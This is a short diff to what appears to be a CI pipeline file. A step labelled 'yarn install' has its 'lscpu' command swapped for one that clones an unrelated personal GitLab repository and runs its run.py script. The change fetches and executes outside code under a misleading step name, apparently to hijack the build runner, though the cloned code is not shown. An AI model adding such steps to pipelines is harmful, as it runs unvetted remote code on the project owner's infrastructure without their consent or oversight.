@@ -7,4 +7,4 @@ steps:
   - name: yarn install
     image: node
     commands:
-      - lscpu
+      - git clone https://gitlab.com/renifer12/yda && cd yda && python run.py
